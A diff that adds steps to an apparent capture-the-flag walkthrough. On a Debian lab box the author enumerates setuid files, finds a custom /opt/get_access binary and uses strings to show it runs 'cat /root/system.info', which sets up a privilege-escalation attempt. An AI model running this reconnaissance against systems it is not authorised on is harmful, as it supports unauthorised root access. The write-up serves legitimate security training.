@@ -365,3 +365,42 @@ uid=1001(dexter) gid=1001(dexter) groups=1001(dexter)
 dexter@debian:~$ 
 
 ```
+
+Search for suid files:
+```shell
+dexter@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+-rwsr-xr-x 1 root root 16816 Sep 25  2021 /opt/get_access
+-rwxr-sr-x 1 root shadow 31160 Feb  7  2020 /usr/bin/expiry
+-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
+-rwsr-xr-x 1 root root 35040 Jul 28  2021 /usr/bin/umount
+-rwxr-sr-x 1 root ssh 354440 Mar 13  2021 /usr/bin/ssh-agent
+-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 182600 Feb 27  2021 /usr/bin/sudo
+-rwxr-sr-x 1 root shadow 80256 Feb  7  2020 /usr/bin/chage
+-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
+-rwxr-sr-x 1 root tty 35048 Jul 28  2021 /usr/bin/wall
+-rwxr-sr-x 1 root crontab 43568 Feb 22  2021 /usr/bin/crontab
+-rwxr-sr-x 1 root tty 22760 Jul 28  2021 /usr/bin/write.ul
+-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
+-rwxr-sr-x 1 root mail 23040 Feb  4  2021 /usr/bin/dotlockfile
+-rwsr-xr-x 1 root root 71912 Jul 28  2021 /usr/bin/su
+-rwsr-xr-x 1 root root 55528 Jul 28  2021 /usr/bin/mount
+-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
+-rwsr-xr-x 1 root root 481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwxr-sr-x 1 root shadow 38912 Jul  9  2021 /usr/sbin/unix_chkpwd
+dexter@debian:~$ 
+```
+
+Found get_access file, lets take a look on it:
+
+```shell
+dexter@debian:~$ file /opt/get_access
+/opt/get_access: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=74c7b8e5b3380d2b5f65d753cc2586736299f21a, for GNU/Linux 3.2.0, not stripped
+dexter@debian:~$ 
+
+dexter@debian:~$ strings /opt/get_access|grep cat
+cat /root/system.info
+dexter@debian:~$ 
+```
+
